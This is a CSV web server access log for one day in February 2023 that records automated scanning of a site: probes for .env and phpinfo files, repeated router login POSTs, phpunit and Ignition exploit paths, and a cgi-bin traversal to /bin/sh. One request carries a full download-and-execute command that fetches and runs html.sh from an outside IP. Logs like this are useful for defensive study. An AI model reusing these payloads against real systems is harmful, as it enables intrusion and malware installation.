Host,Time Stamp,Method,Endpoint,Protocol,Status Code,Content Size
20.68.180.129,15/Feb/2023:05:48:43,GET,/local/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:43,GET,/application/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:43,GET,/admin/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:44,GET,/prod/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:44,GET,/api/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:44,GET,/.env.php,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:45,GET,/sites/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:45,GET,/site/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:45,GET,/download/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:46,GET,/shared/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:46,GET,/.env.dev,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:46,GET,/blogs/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:47,GET,/client/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:47,GET,/docs/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:47,GET,/main/.env,HTTP/1.1,301,169.0
152.89.196.211,15/Feb/2023:05:51:01,GET,/console/,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:05:59:24,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:05:59:24,"-""","""-""","""-",400,0.0
194.87.151.209,15/Feb/2023:06:00:00,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:06:00:00,"-""","""-""","""-",400,0.0
194.87.151.209,15/Feb/2023:06:05:30,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:06:05:30,"-""","""-""","""-",400,0.0
193.32.162.159,15/Feb/2023:06:09:42,GET,/,HTTP/1.1,301,169.0
152.32.172.163,15/Feb/2023:06:11:17,\x16\x03\x01\x01\x09\x01\x00\x01\x05\x03\x03=\xEEo\x19\x9D\x0B)\x08H\x94^\x84\x15q@x\xB20\x03ua\x976d\x91\xAEq\x1D)u'\xF0,\x07.\xB4\x174^\xF8\x04\xB8\xF1,,400,157.0
152.32.172.163,15/Feb/2023:06:11:29,GET,/,HTTP/1.1,301,169.0
152.32.172.163,15/Feb/2023:06:12:06,GET,/assets/img/favicon.png,HTTP/1.1,301,169.0
152.89.196.211,15/Feb/2023:06:12:11,POST,/Autodiscover/Autodiscover.xml,HTTP/1.1,301,169.0
152.32.172.163,15/Feb/2023:06:12:16,GET,/robots.txt,HTTP/1.1,301,169.0
152.32.172.163,15/Feb/2023:06:12:31,GET,/sitemap.xml,HTTP/1.1,301,169.0
152.32.172.163,15/Feb/2023:06:12:43,GET,/js/multipage.js,HTTP/1.1,301,169.0
152.32.172.163,15/Feb/2023:06:12:44,GET,/assets/vendor/waypoints/jquery.waypoints.min.js,HTTP/1.1,301,169.0
152.32.172.163,15/Feb/2023:06:12:44,GET,/assets/vendor/bootstrap/js/bootstrap.bundle.min.js,HTTP/1.1,301,169.0
152.32.172.163,15/Feb/2023:06:12:44,GET,/assets/vendor/owl.carousel/owl.carousel.min.js,HTTP/1.1,301,169.0
152.32.172.163,15/Feb/2023:06:12:44,GET,/js/jquery.js,HTTP/1.1,301,169.0
152.32.172.163,15/Feb/2023:06:12:47,GET,/assets/vendor/jquery/jquery.min.js,HTTP/1.1,301,169.0
152.32.172.163,15/Feb/2023:06:12:47,GET,/assets/js/main.js,HTTP/1.1,301,169.0
152.32.172.163,15/Feb/2023:06:12:47,GET,/assets/vendor/isotope-layout/isotope.pkgd.min.js,HTTP/1.1,301,169.0
152.32.172.163,15/Feb/2023:06:12:47,GET,/assets/vendor/venobox/venobox.min.js,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:06:15:37,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:06:15:38,"-""","""-""","""-",400,0.0
193.142.146.21,15/Feb/2023:06:20:08,"-""","""-""","""-",400,157.0
194.87.151.209,15/Feb/2023:06:25:55,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:06:25:55,"-""","""-""","""-",400,0.0
79.110.62.234,15/Feb/2023:06:26:23,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:06:26:23,"-""","""-""","""-",400,0.0
194.87.151.209,15/Feb/2023:06:31:37,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:06:31:37,"-""","""-""","""-",400,0.0
143.244.50.172,15/Feb/2023:06:33:35,GET,/config/getuser?index=0,HTTP/1.1,301,169.0
152.89.196.211,15/Feb/2023:06:44:44,GET,/_ignition/execute-solution,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:06:46:16,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:06:46:16,"-""","""-""","""-",400,0.0
58.71.199.115,15/Feb/2023:06:48:38,GET,/,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:06:52:20,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:06:52:20,"-""","""-""","""-",400,0.0
194.87.151.209,15/Feb/2023:06:53:12,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:06:53:12,"-""","""-""","""-",400,0.0
193.35.18.163,15/Feb/2023:06:59:17,GET,/shell?cd+/tmp;+wget+193.35.18.163/html.sh;+wget+193.35.18.163/html.sh;+wget+193.35.18.163/html.sh;+chmod+777+html.sh;+./html.sh;rm+-rf+html.sh,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:07:02:55,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:07:02:56,"-""","""-""","""-",400,0.0
152.89.196.211,15/Feb/2023:07:06:53,GET,/,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:07:10:49,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:07:10:49,"-""","""-""","""-",400,0.0
79.110.62.234,15/Feb/2023:07:11:46,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:07:11:46,"-""","""-""","""-",400,0.0
61.165.172.112,15/Feb/2023:07:12:35,GET,/,HTTP/1.1,301,169.0
209.141.35.17,15/Feb/2023:07:15:05,GET,/,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:07:29:21,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:07:29:21,"-""","""-""","""-",400,0.0
194.87.151.209,15/Feb/2023:07:36:18,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:07:36:18,"-""","""-""","""-",400,0.0
79.110.62.234,15/Feb/2023:07:38:20,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:07:38:20,"-""","""-""","""-",400,0.0
90.151.171.108,15/Feb/2023:07:41:59,CONNECT,ip.bablosoft.com:443,HTTP/1.1,400,157.0
90.151.171.108,15/Feb/2023:07:42:00,"-""","""-""","""-",400,157.0
90.151.171.108,15/Feb/2023:07:42:09,GET,http://ip.bablosoft.com/?Z72549204420Q1,HTTP/1.1,301,169.0
90.151.171.108,15/Feb/2023:07:42:10,"-""","""-""","""-",400,157.0
193.32.162.159,15/Feb/2023:07:54:01,GET,/,HTTP/1.1,301,169.0
31.220.1.83,15/Feb/2023:07:55:13,GET,/,HTTP/1.1,301,169.0
152.89.196.211,15/Feb/2023:07:55:20,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh,HTTP/1.1,400,157.0
140.238.69.139,15/Feb/2023:08:07:22,GET,/.env,HTTP/1.1,301,169.0
140.238.69.139,15/Feb/2023:08:07:23,GET,/_profiler/phpinfo,HTTP/1.1,301,169.0
140.238.69.139,15/Feb/2023:08:07:24,GET,/phpinfo,HTTP/1.1,301,169.0
140.238.69.139,15/Feb/2023:08:07:24,GET,/phpinfo.php,HTTP/1.1,301,169.0
140.238.69.139,15/Feb/2023:08:07:25,GET,/info.php,HTTP/1.1,301,169.0
140.238.69.139,15/Feb/2023:08:07:26,GET,/php.php,HTTP/1.1,301,169.0
140.238.69.139,15/Feb/2023:08:07:27,GET,/test.php,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:08:08:19,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:08:08:20,"-""","""-""","""-",400,0.0
43.158.213.246,15/Feb/2023:08:09:00,"-""","""-""","""-",400,157.0
43.158.213.246,15/Feb/2023:08:09:00,o\xFA\xC0\xBE\xB8\xC0\xA4\xC9\x89\xA2\xC2\x8F\x83\xAF\x91\x97\xBE\xCD\xB9\xCF\xAC\x9B\xB0\xAB\xA0\xB6\xB1\xAA\x9D\x9C\x9F\x96\x8D\x93\xCE\xB4\xB3\xB5\x98\xCD\xA6\xFA\xFA\xFA\xFA\x12\xFD\xD8\xF8\xFA\xFA\xC2\xFA\xFA\xFA\xFA\x1Af\xEC\xF9\xFA\xFA\xFA\xFA\xFB\xE5q\xF2\xFA\xFA\xFA\xFA\xFA\xFA\xF9wh\x97ui\xBA\xEA=E\xF0\x1B/\xA7XJ\xF11Y\x0B\xBF\xB1K\x1F\x00\xFA\xF8\xAF5Y\xDB\xA1\xA2,\xE00\xCC\xBAU]<\x15\x14\xBA\xC7W7c\x02\x98\xC996\x95\x1C\xC5\x164yR\xE7\x8C\x90\x8E\x06\x92w\xCD\xE9\x0E\x14!\x19\x87KE\xE1\x86,",)\xEA\x85_\x16I(\x86\x8B?\xADXx\xD7\xE7\xB67\x83\xF1\xFC;\x83\xC8\x0F\xAE\xDD\x1A\xCA\xBF\xD3\xF0\x98\xAA\xD9=\xD0\xD0\xD6\xEF\xABQZ`\xBCrhc@[\x9Cz\xEA\x8AJ|\x8F\xEF\x86V\x11\xDC\xBB\x5C\xF8T\xF3=\x9B\xAF\x11\xBD8\x96\xAD\xE7e~`ov\xCC\xB6\xCA\xDE\xB78\xDC\xD88w9\x91\x8C\xD1\xDE/\x98\xCA\x8D%\xDC\x85+sb\xAE\xE5&\xCA\x08\x06\xFF\x9Ev\xA5\x96\xED\x0F\xBC\xEA2\xFA\x1F7\x03\xC9g\x83)TF$H\xA8\xD2\xA24\x91\x80\xABg\x0CF+\xBFx*w\x19\x01\x0E\xFF\xCF\x1B\xA8\x9AJrF.\x0B\x9D\x84\xF2\xEE\x80Y\x18\xD4\x12\xFE\x14\x89\x9B\x8C\x9AL6\x17\x09\xF25\x5C\xEDb\x02\x89\xCD\xA7|\xC9zL\x97\x81\x92\x96\xA3\xC4g\xB4(\xE3k\x82Gk\xC1\x90B\xE6][\xE1\x02\x9B\x86?Tua\x1C\xE0\xFC\x9F\x8D\xEB\x01\xAB\xC0\xE5\xD6\x98\xD5\xE0<\x93\xEA\x00\x8DT\xE9\x05\x04y-G\x0E\xC5R\x0E\x18\xF4\xC1\xD6\x8E\xBDi\xBBf\xBC1Z-\xFD\x90N\x16\x81\x07C*mk\x11\xBCZ\x02\x85\x95a\xDE\xAB\xA8\xB7\xA3\xA7;\x19\xDE\xB3\xD7",400,157.0
43.158.213.246,15/Feb/2023:08:09:00,"-""","""-""","""-",400,157.0
43.158.213.246,15/Feb/2023:08:09:00,"-""","""-""","""-",400,157.0
152.89.196.211,15/Feb/2023:08:14:49,GET,/,HTTP/1.1,301,169.0
103.80.134.241,15/Feb/2023:08:21:15,GET,/,HTTP/1.1,301,169.0
103.80.134.225,15/Feb/2023:08:21:46,GET,/,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:08:32:27,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:08:32:27,"-""","""-""","""-",400,0.0
90.151.171.108,15/Feb/2023:08:36:10,CONNECT,api.ipify.org:443,HTTP/1.1,400,157.0
90.151.171.108,15/Feb/2023:08:36:11,"-""","""-""","""-",400,157.0
90.151.171.108,15/Feb/2023:08:36:20,GET,http://api.ipify.org?Z72549204420Q1,HTTP/1.1,301,169.0
90.151.171.108,15/Feb/2023:08:36:21,"-""","""-""","""-",400,157.0
152.89.196.211,15/Feb/2023:08:43:13,GET,/actuator/gateway/routes,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:08:46:01,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:08:46:01,"-""","""-""","""-",400,0.0
79.110.62.234,15/Feb/2023:08:53:21,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:08:53:21,"-""","""-""","""-",400,0.0
79.110.62.234,15/Feb/2023:09:17:40,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:09:17:41,"-""","""-""","""-",400,0.0
193.32.162.159,15/Feb/2023:09:19:16,GET,/,HTTP/1.1,301,169.0
125.130.31.173,15/Feb/2023:09:25:13,"-""","""Hello,",world,301,169.0
90.151.171.106,15/Feb/2023:09:27:38,CONNECT,check.best-proxies.ru:443,HTTP/1.1,400,157.0
90.151.171.106,15/Feb/2023:09:27:39,"-""","""-""","""-",400,157.0
90.151.171.106,15/Feb/2023:09:27:44,GET,http://check.best-proxies.ru/ip.php?Z72549204420Q1,HTTP/1.1,301,169.0
90.151.171.106,15/Feb/2023:09:27:50,"-""","""-""","""-",400,157.0
77.91.78.56,15/Feb/2023:09:37:08,"-""","""-""","""-",400,157.0
77.91.78.56,15/Feb/2023:09:37:08,GET,/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,HTTP/1.1,301,169.0
143.244.50.172,15/Feb/2023:09:46:14,GET,/config/getuser?index=0,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:09:46:34,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:09:46:34,"-""","""-""","""-",400,0.0
185.189.182.234,15/Feb/2023:09:49:19,GET,/,HTTP/1.1,400,157.0
52.146.0.67,15/Feb/2023:10:08:56,GET,/dist/,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:10:12:27,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:10:12:27,"-""","""-""","""-",400,0.0
194.87.151.209,15/Feb/2023:10:19:27,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:10:19:27,"-""","""-""","""-",400,0.0
209.141.48.150,15/Feb/2023:10:28:07,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
209.141.48.150,15/Feb/2023:10:28:07,"-""","""-""","""-",400,0.0
90.151.171.106,15/Feb/2023:10:33:20,CONNECT,v4.ident.me:443,HTTP/1.1,400,157.0
90.151.171.106,15/Feb/2023:10:33:25,"-""","""-""","""-",400,157.0
90.151.171.106,15/Feb/2023:10:33:34,GET,http://v4.ident.me?Z72549204420Q1,HTTP/1.1,301,169.0
90.151.171.106,15/Feb/2023:10:33:35,"-""","""-""","""-",400,157.0
79.110.62.234,15/Feb/2023:10:34:20,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:10:34:20,"-""","""-""","""-",400,0.0
128.199.77.96,15/Feb/2023:10:43:40,GET,/,HTTP/1.0,301,169.0
194.87.151.209,15/Feb/2023:10:49:36,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:10:49:36,"-""","""-""","""-",400,0.0
52.167.144.57,15/Feb/2023:10:51:35,GET,/robots.txt,HTTP/1.1,301,169.0
207.46.13.211,15/Feb/2023:10:51:38,GET,/,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:11:00:05,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:11:00:05,"-""","""-""","""-",400,0.0
79.110.62.234,15/Feb/2023:11:24:45,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:11:24:45,"-""","""-""","""-",400,0.0
210.113.70.60,15/Feb/2023:11:36:37,"-""","""Hello,",world,301,169.0
210.113.70.29,15/Feb/2023:11:37:43,"-""","""Hello,",world,301,169.0
107.189.29.121,15/Feb/2023:11:39:14,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
107.189.29.121,15/Feb/2023:11:39:14,"-""","""-""","""-",400,0.0
198.199.92.229,15/Feb/2023:11:43:15,GET,/,HTTP/1.1,301,169.0
167.94.138.119,15/Feb/2023:11:48:26,GET,/,HTTP/1.1,301,169.0
167.94.138.119,15/Feb/2023:11:48:27,GET,/,HTTP/1.1,301,169.0
167.94.138.119,15/Feb/2023:11:48:28,PRI,*,HTTP/2.0,400,157.0
79.110.62.234,15/Feb/2023:11:49:09,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:11:49:09,"-""","""-""","""-",400,0.0
143.244.50.172,15/Feb/2023:11:58:16,GET,/config/getuser?index=0,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:12:11:10,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:12:11:10,"-""","""-""","""-",400,0.0
80.85.241.15,15/Feb/2023:12:23:47,GET,/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,HTTP/1.1,301,169.0
80.85.241.15,15/Feb/2023:12:23:47,\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03|\xD1\x03\x90\x5CA\x88G\xEC\x84\xA5\xBC1z\x8C\x04\xE70S^7\xA6\x9Cg\x01l\xD4C\xD4W-P,e\xF9\xC6?\x9B\xBEO\xBCK\xB7\xE3F\xE4F\x18\xC191\xF4\x83\x18\x1B\x1D\x13\xA6},,400,157.0
114.107.225.150,15/Feb/2023:12:27:01,GET,/,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:12:37:01,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:12:37:01,"-""","""-""","""-",400,0.0
92.118.39.82,15/Feb/2023:13:00:47,GET,/,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:13:06:36,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:13:06:36,"-""","""-""","""-",400,0.0
193.32.162.159,15/Feb/2023:13:12:52,GET,/,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:13:22:48,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:13:22:49,"-""","""-""","""-",400,0.0
79.110.62.234,15/Feb/2023:13:28:46,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:13:28:46,"-""","""-""","""-",400,0.0
194.87.151.209,15/Feb/2023:13:39:13,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:13:39:13,"-""","""-""","""-",400,0.0
136.243.159.115,15/Feb/2023:13:49:25,GET,/agent/timeclock.php,HTTP/1.1,301,169.0
136.243.159.115,15/Feb/2023:13:49:27,GET,/agc/timeclock.php,HTTP/1.1,301,169.0
5.255.109.233,15/Feb/2023:13:49:44,GET,/,HTTP/1.1,400,0.0
79.110.62.234,15/Feb/2023:13:53:07,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:13:53:07,"-""","""-""","""-",400,0.0
92.118.39.82,15/Feb/2023:14:04:54,GET,/,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:14:13:35,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:14:13:35,"-""","""-""","""-",400,0.0
79.110.62.234,15/Feb/2023:14:17:28,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:14:17:28,"-""","""-""","""-",400,0.0
139.59.69.240,15/Feb/2023:14:34:31,GET,/,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:14:42:08,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:14:42:08,"-""","""-""","""-",400,0.0
193.32.162.159,15/Feb/2023:14:43:23,GET,/,HTTP/1.1,301,169.0
185.180.143.79,15/Feb/2023:14:48:24,GET,/cgi-bin/authLogin.cgi,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:15:05:28,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:15:05:28,"-""","""-""","""-",400,0.0
79.110.62.234,15/Feb/2023:15:10:25,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:15:10:25,"-""","""-""","""-",400,0.0
61.52.232.209,15/Feb/2023:15:14:44,POST,/HNAP1/,HTTP/1.0,301,169.0
194.87.151.209,15/Feb/2023:15:35:27,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:15:35:27,"-""","""-""","""-",400,0.0
194.87.151.209,15/Feb/2023:15:37:30,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:15:37:31,"-""","""-""","""-",400,0.0
79.110.62.234,15/Feb/2023:15:38:21,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:15:38:21,"-""","""-""","""-",400,0.0
194.87.151.209,15/Feb/2023:15:46:38,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:15:46:38,"-""","""-""","""-",400,0.0
162.142.125.221,15/Feb/2023:17:08:47,GET,/,HTTP/1.1,301,169.0
162.142.125.221,15/Feb/2023:17:08:47,GET,/,HTTP/1.1,301,169.0
162.142.125.221,15/Feb/2023:17:08:48,PRI,*,HTTP/2.0,400,157.0
183.136.225.32,15/Feb/2023:17:54:44,GET,/,HTTP/1.1,301,169.0
183.136.225.32,15/Feb/2023:17:55:43,GET,/,HTTP/1.1,301,169.0
183.136.225.32,15/Feb/2023:17:55:57,GET,/assets/img/favicon.png,HTTP/1.1,301,169.0
183.136.225.32,15/Feb/2023:17:56:06,GET,/robots.txt,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:18:12:47,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:18:12:47,"-""","""-""","""-",400,0.0
143.244.50.172,15/Feb/2023:18:26:01,GET,/config/getuser?index=0,HTTP/1.1,301,169.0
85.96.146.17,15/Feb/2023:18:47:11,GET,/,HTTP/1.0,301,169.0
45.79.181.179,15/Feb/2023:19:04:23,"\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x0C\xD8x\x80@Q\x8DV\xBA\xB3\xB3\xCC*\x7Fa\xDC\xC0\x9D\xD5\xA3zk4\x0C,{\x16b\x96*H\xFE\x00\x00","\xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0",,400,157.0
204.157.218.238,15/Feb/2023:19:10:03,GET,/,HTTP/1.1,301,169.0
82.64.146.199,15/Feb/2023:19:13:20,GET,/,HTTP/1.0,301,169.0
170.64.172.220,15/Feb/2023:19:16:09,"-""","""-""","""-",400,157.0
170.64.172.220,15/Feb/2023:19:16:09,"-""","""-""","""-",400,157.0
170.64.172.220,15/Feb/2023:19:16:09,GET,/,HTTP/1.1,301,169.0
170.64.172.220,15/Feb/2023:19:16:10,GET,/client/get_targets,HTTP/1.1,301,169.0
143.244.50.172,15/Feb/2023:20:02:34,GET,/config/getuser?index=0,HTTP/1.1,301,169.0
193.169.194.18,15/Feb/2023:20:10:37,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
193.169.194.18,15/Feb/2023:20:10:38,"-""","""-""","""-",400,0.0
193.32.162.159,15/Feb/2023:20:37:22,GET,/,HTTP/1.1,301,169.0
165.227.216.59,15/Feb/2023:21:00:07,GET,/,HTTP/1.0,301,169.0
185.246.220.98,15/Feb/2023:21:16:10,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
185.246.220.98,15/Feb/2023:21:16:10,"-""","""-""","""-",400,0.0
189.141.70.166,15/Feb/2023:21:17:44,GET,/,HTTP/1.1,301,169.0
5.188.210.227,15/Feb/2023:21:35:48,"-""","""-""","""-",400,157.0
37.44.238.197,15/Feb/2023:21:38:20,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
37.44.238.197,15/Feb/2023:21:38:21,"-""","""-""","""-",400,0.0
37.44.238.199,15/Feb/2023:21:41:34,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
37.44.238.199,15/Feb/2023:21:41:34,"-""","""-""","""-",400,0.0
165.227.216.59,15/Feb/2023:21:46:24,GET,/,HTTP/1.1,301,169.0
37.44.238.197,15/Feb/2023:21:47:27,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
37.44.238.197,15/Feb/2023:21:47:28,"-""","""-""","""-",400,0.0
5.188.210.227,15/Feb/2023:21:48:42,"-""","""-""","""-",400,157.0
37.44.238.199,15/Feb/2023:21:49:48,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
37.44.238.199,15/Feb/2023:21:49:48,"-""","""-""","""-",400,0.0
117.215.75.107,15/Feb/2023:21:51:30,GET,/,HTTP/1.1,301,169.0
93.171.156.154,15/Feb/2023:21:51:45,GET,/,HTTP/1.1,301,169.0
5.188.210.227,15/Feb/2023:21:57:38,GET,http://5.188.210.227/echo.php,HTTP/1.1,301,169.0
185.246.220.98,15/Feb/2023:22:06:40,GET,/,HTTP/1.1,301,169.0
149.56.74.88,15/Feb/2023:22:13:36,GET,/.env,HTTP/1.1,301,169.0
149.56.74.88,15/Feb/2023:22:13:37,POST,/,HTTP/1.1,301,169.0
193.32.162.159,15/Feb/2023:22:18:04,GET,/,HTTP/1.1,301,169.0
185.246.220.98,15/Feb/2023:22:25:16,GET,/,HTTP/1.1,301,169.0
167.94.146.58,15/Feb/2023:22:29:41,GET,/,HTTP/1.1,301,169.0
167.94.146.58,15/Feb/2023:22:29:42,GET,/,HTTP/1.1,301,169.0
167.94.146.58,15/Feb/2023:22:29:42,PRI,*,HTTP/2.0,400,157.0
117.214.215.194,15/Feb/2023:22:45:29,GET,/,HTTP/1.1,301,169.0
52.167.144.57,15/Feb/2023:23:02:11,GET,/robots.txt,HTTP/1.1,301,169.0
207.46.13.211,15/Feb/2023:23:02:19,GET,/,HTTP/1.1,301,169.0
94.102.61.10,15/Feb/2023:23:04:32,GET,/assets/img/favicon.png,HTTP/1.1,301,169.0
94.102.61.10,15/Feb/2023:23:04:33,GET,/assets/img/apple-touch-icon.png,HTTP/1.1,301,169.0
94.102.61.10,15/Feb/2023:23:04:34,GET,/,HTTP/1.1,301,169.0
185.246.220.98,15/Feb/2023:23:42:36,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
185.246.220.98,15/Feb/2023:23:42:36,"-""","""-""","""-",400,0.0
37.44.238.197,15/Feb/2023:23:55:34,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
37.44.238.197,15/Feb/2023:23:55:35,"-""","""-""","""-",400,0.0
